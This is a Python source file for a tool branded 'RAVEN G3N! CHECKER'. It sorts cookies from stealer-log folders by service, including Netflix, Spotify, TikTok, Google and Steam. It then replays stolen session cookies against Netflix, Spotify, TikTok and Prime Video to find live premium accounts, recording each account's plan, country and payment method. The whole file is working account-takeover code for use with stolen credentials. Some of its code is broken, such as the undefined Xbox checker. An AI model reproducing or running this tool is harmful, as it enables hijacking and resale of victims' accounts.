import os
from datetime import *
import tkinter as tk
from tkinter import filedialog, Tk
import asyncio
from concurrent.futures import *
import re
import aiohttp
from pystyle import *
import sys
from bs4 import BeautifulSoup
import uuid
import hashlib
import ctypes
import http.cookiejar
from threading import Lock
import subprocess
import json

output_lock = Lock()

valid_count = 0
invalid_count = 0
checked_count = 0
remaining_count = 0

def show_intro():
    Write.Print(f"""
                
                     
██████╗░░█████╗░██╗░░░██╗███████╗███╗░░██╗  ░██████╗░██████╗░███╗░░██╗
██╔══██╗██╔══██╗██║░░░██║██╔════╝████╗░██║  ██╔════╝░╚════██╗████╗░██║
██████╔╝███████║╚██╗░██╔╝█████╗░░██╔██╗██║  ██║░░██╗░░█████╔╝██╔██╗██║
██╔══██╗██╔══██║░╚████╔╝░██╔══╝░░██║╚████║  ██║░░╚██╗░╚═══██╗██║╚████║
██║░░██║██║░░██║░░╚██╔╝░░███████╗██║░╚███║  ╚██████╔╝██████╔╝██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝  ░╚═════╝░╚═════╝░╚═╝░░╚══╝
    """, Colors.purple_to_blue, interval=0.000)
    print("\n\n")

show_intro()




def display_live_counter():
    global valid_count, invalid_count, checked_count, remaining_count

    counter_info = f"VALID: {valid_count};  INVALID: {invalid_count};  CHECKED: {checked_count};  REMAINING: {remaining_count}"

    ctypes.windll.kernel32.SetConsoleTitleW(counter_info)

    return counter_info

# Function to remove duplicate files
remaining_count = 0
total_files = 0

def hash_file(file_path):
    hasher = hashlib.md5()
    with open(file_path, 'rb') as file:
        chunk = file.read(8192)
        while chunk:
            hasher.update(chunk)
            chunk = file.read(8192)
    return hasher.hexdigest()

def remove_duplicates(folder_path):
    global total_files

    file_hashes = set()
    deleted_cookies_count = 0
    total_files = 0  

    for filename in os.listdir(folder_path):
        if filename.endswith('.txt'):
            total_files += 1  # Increment total_files counter

    for filename in os.listdir(folder_path):
        if filename.endswith('.txt'):
            file_path = os.path.join(folder_path, filename)
            file_hash = hash_file(file_path)

            # If the file's hash already exists, it's a duplicate
            if file_hash in file_hashes:
                os.remove(file_path)
                deleted_cookies_count += 1
                total_files -= 1  # Decrement total_files counter for each duplicate removed
            else:
                file_hashes.add(file_hash)

    print(f"Deleted {deleted_cookies_count} duplicate cookies.")
    print(f"Total cookies: {total_files}")

# Function to get number of threads
def get_num_threads():
    while True:
        print("Choose the speed:")
        print("1. Low")
        print("2. Balanced")
        print("3. High")
        print("4. Ultra")
        print("5. Extreme")
        print("6. Custom")
        option = input("Enter your choice (1-6): ")

        if option in ['1', '2', '3', '4', '5', '6']:
            if option == '1':
                return 7
            elif option == '2':
                return 15.
            elif option == '3':
                return 30
            elif option == '4':
                return 50
            elif option == '5':
                return 100
            elif option == '6':
                custom_speed = input("Enter the custom speed: ")
                if custom_speed.isdigit():
                    return int(custom_speed)
                else:
                    print("Invalid input. Please enter a valid number.")
        else:
            print("Invalid option. Please choose a number between 1 and 6.")



def select_logs_folder():
    root = tk.Tk()
    root.withdraw()
    root_folder = filedialog.askdirectory(title="Select Logs Folder")
    return root_folder


def find_and_copy_cookies(root_folder):
    print(Colors.red + "Searching for cookies, please wait...")
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    # Define output paths for all services
    output_paths = {
        "Netflix": os.path.join("Logs Output", current_time, "Netflix"),
        "Spotify": os.path.join("Logs Output", current_time, "Spotify"),
        "TikTok": os.path.join("Logs Output", current_time, "TikTok"),
        "Instagram": os.path.join("Logs Output", current_time, "Instagram"),
        "PrimeVideo": os.path.join("Logs Output", current_time, "PrimeVideo"),
        "Crunchyroll": os.path.join("Logs Output", current_time, "Crunchyroll"),
        "Facebook": os.path.join("Logs Output", current_time, "Facebook"),
        "Discord": os.path.join("Logs Output", current_time, "Discord"),
        "ChatGPT": os.path.join("Logs Output", current_time, "ChatGPT"),
        "EpicGames": os.path.join("Logs Output", current_time, "EpicGames"),
        "Google": os.path.join("Logs Output", current_time, "Google"),
        "Steam": os.path.join("Logs Output", current_time, "Steam"),
        "Ubisoft": os.path.join("Logs Output", current_time, "Ubisoft"),
    }

    # Create output directories if they do not exist
    for path in output_paths.values():
        if not os.path.exists(path):
            os.makedirs(path)

    # Initialize counters
    total_cookies = {key: 0 for key in output_paths.keys()}
    file_counters = {key: 1 for key in output_paths.keys()}

    for folder_path, _, _ in os.walk(root_folder):
        cookies_folder = os.path.join(folder_path, 'cookies')

        if os.path.exists(cookies_folder) and os.path.isdir(cookies_folder):
            for filename in os.listdir(cookies_folder):
                file_path = os.path.join(cookies_folder, filename)
                if filename.endswith('.txt'):
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                        lines = file.readlines()
                        extracted_cookies = extract_cookies(lines)

                        # Write cookies to their respective output files
                        for service, cookies in extracted_cookies.items():
                            if cookies:
                                result_file = os.path.join(output_paths[service], f'{service.lower()}_cookies_{file_counters[service]}.txt')
                                with open(result_file, 'w', encoding='utf-8') as result:
                                    result.write('\n'.join(cookies))
                                file_counters[service] += 1
                                total_cookies[service] += len(cookies)

    # Print results
    for service, count in total_cookies.items():
        print(f"{Colors.red}{count} {service} cookies extracted.")
    print(Colors.white)


def extract_cookies(lines):
    extracted_cookies = {
        "Netflix": [],
        "Spotify": [],
        "TikTok": [],
        "Instagram": [],
        "PrimeVideo": [],
        "Crunchyroll": [],
        "Facebook": [],
        "Discord": [],
        "ChatGPT": [],
        "EpicGames": [],
        "Google": [],
        "Steam": [],
        "Ubisoft": []
    }

    for line in lines:
        if not line.startswith('#'):
            cookie = parse_cookie_line(line)

            if cookie:
                # Check each domain and append cookies accordingly
                if '.netflix.com' in cookie.domain:
                    extracted_cookies["Netflix"].append(line.strip())
                elif '.spotify.com' in cookie.domain:
                    extracted_cookies["Spotify"].append(line.strip())
                elif '.tiktok.com' in cookie.domain:
                    extracted_cookies["TikTok"].append(line.strip())
                elif '.instagram.com' in cookie.domain:
                    extracted_cookies["Instagram"].append(line.strip())
                elif '.primevideo.com' in cookie.domain:
                    extracted_cookies["PrimeVideo"].append(line.strip())
                elif '.crunchyroll.com' in cookie.domain:
                    extracted_cookies["Crunchyroll"].append(line.strip())
                elif '.facebook.com' in cookie.domain:
                    extracted_cookies["Facebook"].append(line.strip())
                elif '.discord.com' in cookie.domain:
                    extracted_cookies["Discord"].append(line.strip())
                elif 'chat.openai.com' in cookie.domain:  # Example for ChatGPT
                    extracted_cookies["ChatGPT"].append(line.strip())
                elif '.epicgames.com' in cookie.domain:
                    extracted_cookies["EpicGames"].append(line.strip())
                elif '.google.com' in cookie.domain:
                    extracted_cookies["Google"].append(line.strip())
                elif '.steampowered.com' in cookie.domain:
                    extracted_cookies["Steam"].append(line.strip())
                elif '.ubisoft.com' in cookie.domain:
                    extracted_cookies["Ubisoft"].append(line.strip())

    return extracted_cookies


def parse_cookie_line(line):
    parts = line.strip().split('\t')

    if len(parts) >= 7:
        return http.cookiejar.Cookie(
            version=0,
            name=parts[5],
            value=parts[6],
            port=None,
            port_specified=False,
            domain=parts[0],
            domain_specified=bool(parts[1]),
            domain_initial_dot=parts[0].startswith('.'),
            path=parts[2],
            path_specified=bool(parts[3]),
            secure=bool(parts[4]),
            expires=int(parts[4]) if parts[4].isdigit() else None,
            discard=False,
            comment=None,
            comment_url=None,
            rest={},
            rfc2109=False,
        )
    else:
        return None


async def check_netflix(path):
    cookies = {}
    l = []
    async with aiohttp.ClientSession(trust_env=True) as session:
        try:
            with open(path, 'r', encoding='utf-8') as file:
                for line in file:
                    if any(keyword in line for keyword in ["NetflixId", "SecureNetflixId"]):
                        l.append(line)
                        cookie_parts = re.split(r'\t', line.strip())
                        name, value = cookie_parts[5], cookie_parts[6]
                        cookies[name] = value
            url = "https://www.netflix.com/YourAccount"

            async with session.get(url, cookies=cookies) as response:
                if response.url.path == '/account':
                    html = await response.text()

                    # Parse the HTML using BeautifulSoup
                    soup = BeautifulSoup(html, 'lxml')

                    # Find the plan information
                    plan_tag = soup.find('h3', {'data-uia': 'account-overview-page+membership-card+title'})
                    if plan_tag:
                        plan_text = plan_tag.get_text(separator=" ", strip=True)
                        plan_parts = plan_text.split(' ', 1)
                        plan = plan_parts[0]
                        if len(plan_parts) > 1:
                            plan += ' ' + plan_parts[1]
                    else:
                        plan = "Free"

                    extra = "manage-extra-members" in html

                    country_match = re.search(r'"currentCountry":"(.*?)"', html)
                    country_text = country_match.group(1) if country_match else "Country not found"

                    payment_method = "Third party"
                    if "VISA.png" in html:
                        payment_method = "Visa"
                    elif "MASTERCARD.png" in html:
                        payment_method = "Mastercard"
                    elif "PAYPAL.png" in html:
                        payment_method = "Paypal"
                    elif "Xfinity" in html:
                        payment_method = "Xfinity"
                    elif "T-Mobile" in html:
                        payment_method = "T-Mobile"
                    
                    lines = l
                    return {
                        "plan": plan,
                        "extra": extra,
                        "country": country_text,
                        "payment_method": payment_method,
                        "lines": lines
                    }
                else:
                    return False
        except Exception as e:
            print(f"Error checking Netflix: {e}")
            return False
        
output_folder = None
def sanitize_filename(filename):
    return re.sub(r'[^\w\-_\. ]', '_', filename)
def process_netflix_file(file_path):
    global valid_count, invalid_count, checked_count, remaining_count, output_folder, total_files

    result = asyncio.run(check_netflix(file_path))

    if result:
        try:
            if result["plan"] == "Free":
                invalid_count += 1
                checked_count += 1
                remaining_count = total_files - checked_count
                with output_lock:
                    print(f"{Colors.yellow}[L] Free | {Colors.white}{os.path.basename(file_path)}")
                sys.stdout.flush()
                os.remove(file_path)
                display_live_counter()
                return

            valid_count += 1
            checked_count += 1
            remaining_count = total_files - checked_count

            if output_folder is None:
                output_folder = os.path.join("netflix_output", datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
                os.makedirs(output_folder, exist_ok=True)

            output_file_name = f"ExtraMember-{result['country']}-{result['plan']}-{result['payment_method']}_{uuid.uuid4()}.txt" if result['extra'] \
                else f"{result['country']}_{result['plan']}-{result['payment_method']}_{uuid.uuid4()}.txt"
            output_file_name = sanitize_filename(output_file_name)
            output_file_path = os.path.join(output_folder, output_file_name)

            with open(output_file_path, 'w', encoding='utf-8') as output_file:
                for line in result['lines']:
                    output_file.write(line)

                formatted_output = f"""
=============================
|||***By RAVEN G3N! CHECKER***
Plan: {result['plan']}
ExtraMember: {result['extra']}
Country: {result['country']}
Payment Method: {result['payment_method']}
|||||||| https://discord.gg/qdcBZD67pd |||||||||||
=====================================================
"""
                output_file.write(formatted_output)

            if os.path.exists(output_file_path):
                with output_lock:
                    print(f"{Colors.green}[W] Valid | {Colors.white}{os.path.basename(file_path)}")
                sys.stdout.flush()
                os.remove(file_path)
            else:
                with output_lock:
                    print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
                    os.remove(file_path)
                sys.stdout.flush()

            display_live_counter()
        except Exception as e:
            print(f"Error processing file {file_path}: {e}")
            invalid_count += 1
            checked_count += 1
            remaining_count = total_files - checked_count
            with output_lock:
                print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
                os.remove(file_path)
            sys.stdout.flush()
            display_live_counter()
    else:
        invalid_count += 1
        checked_count += 1
        remaining_count = total_files - checked_count
        with output_lock:
            print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
            os.remove(file_path)
        sys.stdout.flush()
        display_live_counter()


async def check_spotify(path):
    cookies = {}
    lines = []
    async with aiohttp.ClientSession(trust_env=True) as session:
        try:
            with open(path, 'r', encoding='utf-8') as file:
                for line in file:
                    if any(keyword in line for keyword in ["sp_dc", "sp_key"]):
                        lines.append(line)
                        cookie_parts = re.split(r'\t', line.strip())
                        name, value = cookie_parts[5], cookie_parts[6]
                        cookies[name] = value
        except FileNotFoundError:
            return {"error": "File not found"}

        url = "https://www.spotify.com/account/overview/"
        await asyncio.sleep(0.8)
        async with session.get(url, cookies=cookies) as response:
            if not str(response.url).count("login"):
                result = {}
                html = await response.text()
                if "Spotify Free" in html:
                    result["plan"] = "Free" 
                elif "Premium Family" in html:
                    result['plan'] = "Premium Family"
                    result["sub"] = "Owner" if "Your next bill is for" in html else "Member"
                elif "Premium Individual" in html:
                    result['plan'] = "Premium Family"
                    result["sub"] = "Owner" if "Your next bill is for" in html else "Payment Pending"
                    result["plan"] = "Premium Individual"
                elif "Premium Duo" in html:
                    result['plan'] = "Premium Family"
                    result["sub"] = "Owner" if "Your next bill is for" in html else "Member"
                    result["plan"] = "Premium Duo"
                elif "Premium Student" in html:
                    result['plan'] = "Premium Family"
                    result["sub"] = "Owner" if "Your next bill is for" in html else "Payment Pending"
                    result["plan"] = "Premium Student"
                else:
                    result["plan"] = "Unknown"

                result["lines"] = lines
                return result
            else:
                return None

output_folder = None
def process_spotify_file(file_path):
    global valid_count, invalid_count, checked_count, remaining_count, output_folder, total_files

    result = asyncio.run(check_spotify(file_path))

    if result:
        if result['plan'] == "Free":
            checked_count += 1
            invalid_count += 1
            remaining_count = total_files - checked_count
            with output_lock:
                print(f"{Colors.yellow}[L] Free | {Colors.white}{os.path.basename(file_path)}")
            sys.stdout.flush()
            display_live_counter()
        else:
            checked_count += 1
            remaining_count = total_files - checked_count

            if output_folder is None:
                output_folder = os.path.join("spotify_output", datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
                os.makedirs(output_folder, exist_ok=True)

            output_file_path = os.path.join(output_folder, f"{result['plan']}-{result['sub'] if result['sub'] else 'OWNER'}_{uuid.uuid4()}.txt")

            with open(output_file_path, 'w', encoding='utf-8') as output_file:
                output_file.write(''.join(result['lines']))

                formatted_output = f"""
==============================
 |||***By RAVEN G3N! CHECKER***
 Plan: {result['plan']}
 status: {result['sub'] if result['sub'] else 'OWNER'}
 |||||||| https://discord.gg/qdcBZD67pd |||||||||||
 =====================================================
                         """
                output_file.write(formatted_output)

            valid_count += 1
            with output_lock:
                print(f"{Colors.green}[W] Valid | {Colors.white}{os.path.basename(file_path)}")
            sys.stdout.flush()
            display_live_counter()
    else:
        invalid_count += 1
        checked_count += 1
        remaining_count = total_files - checked_count
        with output_lock:
            print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
        sys.stdout.flush()
        display_live_counter()

async def check_tiktok(file_path):
    def format_number(num):
        if num < 1000:
            return str(num)
        elif num < 10**6:
            return f"{num // 1000}K"
        else:
            return f"{num // 10**6}M"

    async with aiohttp.ClientSession() as session:
        with open(file_path, 'r') as file:
            text = file.read()
            pattern = r"sessionid\t([\w]+)"
            cok = re.search(pattern, text)
            if cok:
                cookie_value = cok.group(1)
                cookies = {"sessionid": cookie_value}
                url = "https://www.tiktok.com/"
                async with session.get(url, cookies=cookies) as response:
                    if "foryou" not in str(response.url):
                        html = await response.text()
                        follower_count = get_match(html, r'"followerCount":(\d+)')
                        heart_count = get_match(html, r'"heartCount":(\d+)')
                        name = get_match(html, r'"uniqueId":"(.*?)"')
                        return {
                            "follow": format_number(int(follower_count)),
                            "heart": format_number(int(heart_count)),
                            "name": name
                        }
                    else:
                        return False
            else:
                return False

def get_match(text, pattern):
    match = re.search(pattern, text)
    return match.group(1) if match else "Not found"

output_folder = None

def process_tiktok_file(file_path):
    global valid_count, invalid_count, checked_count, remaining_count, output_folder, total_files

    with open(file_path, 'r') as file:
        sessionid_line = None
        for line in file:
            if "tiktok.com" in line:
                sessionid_line = line.strip()
                break

    result = asyncio.run(check_tiktok(file_path))

    checked_count += 1
    remaining_count = total_files - checked_count

    if result:  # Check if result is True, indicating a successful login or data retrieval
        valid_count += 1
        if output_folder is None:
            output_folder = os.path.join("tiktok_output", datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
            os.makedirs(output_folder, exist_ok=True)

        output_file_path = os.path.join(output_folder, f"[{result['follow']}-Followers]-[{result['heart']}-Likes]-[{result['name']}].txt")

        formatted_output = f"""
{sessionid_line if sessionid_line else 'Session ID line: Not found'}

=============================
|||***By RAVEN G3N! CHECKER***
Username: {result.get('name', 'Not found')}
Followers: {result.get('follow', 'Not found')}
Likes: {result.get('heart', 'Not found')}
|||||||| https://discord.gg/qdcBZD67pd |||||||||||
=====================================================
"""

        with open(output_file_path, 'w', encoding='utf-8') as output_file:
            output_file.write(formatted_output)
        with output_lock:
            print(f"{Colors.green}[W] Valid | {Colors.white}{os.path.basename(file_path)}")

    else:
        invalid_count += 1
        with output_lock:
            print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")

    sys.stdout.flush()
    display_live_counter()
def json_to_netscape(json_data):
    netscape_cookies = ""
    for cookie in json_data:
        try:
            host_only = cookie.get('hostOnly', False)  
            netscape_cookies += "{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                cookie['domain'],
                'TRUE' if host_only else 'FALSE',
                cookie['path'],
                'TRUE' if cookie['secure'] else 'FALSE',
                str(cookie.get('expirationDate', '')),
                cookie['name'],
                cookie['value']
            )
        except KeyError:
            print("Skipping invalid cookie:", cookie)
    return netscape_cookies

def convert_folder_to_netscape(folder_path):
    for file_name in os.listdir(folder_path):
        if file_name.endswith('.json') or ('.txt'):
            file_path = os.path.join(folder_path, file_name)
            try:
                with open(file_path, 'r') as file:
                    json_data = extract_json_from_brackets(file)
                    if json_data:
                        netscape_cookies = json_to_netscape(json_data)
                        save_netscape_cookie(netscape_cookies, folder_path, file_name)
            except json.JSONDecodeError as e:
                print(f"Error reading {file_name}: {str(e)}")

def extract_json_from_brackets(file):
    json_string = ""
    inside_brackets = False
    for line in file:
        if "[" in line:
            inside_brackets = True
        if inside_brackets:
            json_string += line
        if "]" in line:
            inside_brackets = False
            try:
                return json.loads(json_string)
            except json.JSONDecodeError as e:
                print(f"Error decoding JSON: {str(e)}")
    return None

def save_netscape_cookie(netscape_cookies, folder_path, file_name):
    netscape_folder = os.path.join(folder_path, "netscape")
    if not os.path.exists(netscape_folder):
        os.makedirs(netscape_folder)
    file_name = os.path.splitext(file_name)[0] + ".txt"
    file_path = os.path.join(netscape_folder, file_name)
    with open(file_path, 'w') as file:
        file.write(netscape_cookies)

async def check_primevideo(path):
    cookies = {}
    async with aiohttp.ClientSession(trust_env=True) as session:
        with open(path, 'r', encoding='utf-8') as file:
            for line in file:
                if ".primevideo.com" in line:
                    cookie_parts = re.split(r'\t', line.strip())
                    name, value = cookie_parts[5], cookie_parts[6]
                    cookies[name] = value
        url = "https://www.primevideo.com/offers/nonprimehomepage/ref=dv_web_force_rootx"
        async with session.get(url, cookies=cookies, allow_redirects=True) as response:
            if "Your Watchlist" in await response.text() or "Continue watching" in await response.text():
                return {"lines": [line for line in open(path, 'r', encoding='utf-8')]}
            else:
                return False

output_folder = None

def process_primevideo_file(file_path):
    global valid_count, invalid_count, checked_count, remaining_count, output_folder, total_files

    result = asyncio.run(check_primevideo(file_path))

    if result:
        valid_count += 1
        checked_count += 1
        remaining_count = total_files - checked_count
        with output_lock:
            print(f"{Colors.green}[W] Valid | {Colors.white}{os.path.basename(file_path)}")
        sys.stdout.flush()
        display_live_counter()

        if output_folder is None:
            output_folder = os.path.join("primevideo_output", datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
            os.makedirs(output_folder, exist_ok=True)

        output_file = os.path.join(output_folder, f"PrimeVideo_cookie_{uuid.uuid4()}.txt")

        with open(output_file, 'w', encoding='utf-8') as output_file:
            output_file.write(''.join(result['lines']))

            formatted_output = f"""
==============================
 |||***By RAVEN G3N! CHECKER***
 |||||||| https://discord.gg/qdcBZD67pd |||||||||||
 =====================================================
                         """
            output_file.write(formatted_output)

    else:
        invalid_count += 1
        checked_count += 1
        remaining_count = total_files - checked_count
        with output_lock:
            print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
        sys.stdout.flush()
        display_live_counter()

invalid_count = 0
checked_count = 0
valid_count = 0



def clear_screen():
    if os.name == 'nt':
        os.system('cls')


def select_logs_folder():
    root = tk.Tk()
    root.withdraw()
    root_folder = filedialog.askdirectory(title="Select Logs Folder")
    return root_folder




def main():
    global remaining_count, output_folder, valid_count, invalid_count, checked_count, total_files, current_datetime,file_path

    files_to_process = []  

    while True:
        clear_screen()
        clear_screen()
        show_intro()
        print("Choose an option:")
        print("1. Netflix Checker")
        print("2. Spotify Checker")
        print("3. TikTok Checker")
        print("4. PrimeVideo Checker")
        print("5. Xbox Checker")
        print("6. Logs Extractor")
        print("7. JSON to Netscape Converter")
        print("8. Exit")
        try:
            choice = int(input("Enter your option: "))
        except ValueError:
            print("Invalid input. Please enter a valid integer.")
            continue

        if choice not in [1, 2, 3, 4, 5, 6, 7, 8]:
            print("Invalid choice. Please enter a valid option.")
            continue

        if choice == 1:
            output_folder = None
            root = tk.Tk()
            root.withdraw()  
            folder_path = filedialog.askdirectory(title="Select Folder")  
            remove_duplicates(folder_path)

            num_threads = get_num_threads()

            files_to_process = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if file.endswith(".txt")]
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                executor.map(process_netflix_file, files_to_process)

            valid_count = 0
            invalid_count = 0
            checked_count = 0
            remaining_count = 0

            input("Netflix Checker finished. Press Enter to continue...")
            continue

        elif choice == 2:
            output_folder = None
            root = tk.Tk()
            root.withdraw()  
            folder_path = filedialog.askdirectory(title="Select Folder")  
            remove_duplicates(folder_path)

            num_threads = get_num_threads()

            files_to_process = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if file.endswith(".txt")]
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                executor.map(process_spotify_file, files_to_process)

            valid_count = 0
            invalid_count = 0
            checked_count = 0
            remaining_count = 0

            input("Spotify Checker finished. Press Enter to continue...")
            continue

        elif choice == 3:
            output_folder = None
            root = tk.Tk()
            root.withdraw()  
            folder_path = filedialog.askdirectory(title="Select Folder") 
            remaining_count = len(files_to_process)
            remove_duplicates(folder_path)

            num_threads = get_num_threads()

            files_to_process = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if file.endswith(".txt")]
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                executor.map(process_tiktok_file, files_to_process)
            
            valid_count = 0
            invalid_count = 0
            checked_count = 0
            remaining_count = 0

            input("TikTok Checker finished. Press Enter to continue...")
            continue

        elif choice == 4:
            output_folder = None
            root = tk.Tk()
            root.withdraw()  
            folder_path = filedialog.askdirectory(title="Select Folder") 
            remaining_count = len(files_to_process)
            remove_duplicates(folder_path)

            num_threads = get_num_threads()

            files_to_process = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if file.endswith(".txt")]
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                executor.map(process_primevideo_file, files_to_process)

            valid_count = 0
            invalid_count = 0
            checked_count = 0
            remaining_count = 0

            input("PrimeVideo Checker finished. Press Enter to continue...")
            continue

        elif choice == 5:
            output_folder = None
            root = tk.Tk()
            root.withdraw()  
            folder_path = filedialog.askdirectory(title="Select Folder")  
            remove_duplicates(folder_path)

            num_threads = get_num_threads()

            files_to_process = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if file.endswith(".txt")]
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                executor.map(process_xbox_file, files_to_process)

            input("Xbox Checker finished. Press Enter to continue...")
            continue

        elif choice == 6:
            root_folder = select_logs_folder()
            if root_folder:
                find_and_copy_cookies(root_folder)

            input("Logs extraction finished. Press Enter to continue...")
            continue

        elif choice == 7:
            root = tk.Tk()
            root.withdraw()
            folder_path = filedialog.askdirectory(title="Select folder containing Netflix JSON cookies")
            if folder_path:
                convert_folder_to_netscape(folder_path)
                print("Conversion successful. Netscape cookies saved to 'netscape' folder.")
                input("Press Enter to continue...")
            continue

        elif choice == 8:
            print("Exiting")
            sys.exit()

        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    main()








